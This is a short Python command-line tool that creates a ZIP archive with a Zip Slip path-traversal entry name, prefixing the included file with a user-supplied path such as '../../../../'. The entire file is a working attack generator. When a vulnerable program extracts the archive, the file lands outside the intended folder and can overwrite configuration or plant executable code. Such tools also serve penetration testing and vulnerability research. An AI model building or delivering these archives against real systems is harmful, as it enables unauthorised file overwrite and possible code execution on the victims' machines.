import argparse
import zipfile
import os

def create_zip(zip_name, file_path, zip_slip_path):
    if not os.path.isfile(file_path):
        print(f"Error: File '{file_path}' does not exist.")
        return
    
    with zipfile.ZipFile(zip_name, 'w') as zipf:
        file_name = os.path.basename(file_path)
        zip_slip_full_path = os.path.join(zip_slip_path, file_name)
        
        zipf.write(file_path, zip_slip_full_path)
        print(f"File '{file_path}' added to zip as '{zip_slip_full_path}'.")

def main():
    parser = argparse.ArgumentParser(description='Create a ZIP file with a Zip Slip path')
    parser.add_argument('-o', '--output', required=True, help='Name of the zip file')
    parser.add_argument('-f', '--file', required=True, help='Path to the file to include')
    parser.add_argument('-z', '--zipslip', required=True, help='Zip slip path (e.g., ../../../../)')
    
    args = parser.parse_args()
    
    create_zip(args.output, args.file, args.zipslip)

if __name__ == '__main__':
    main()
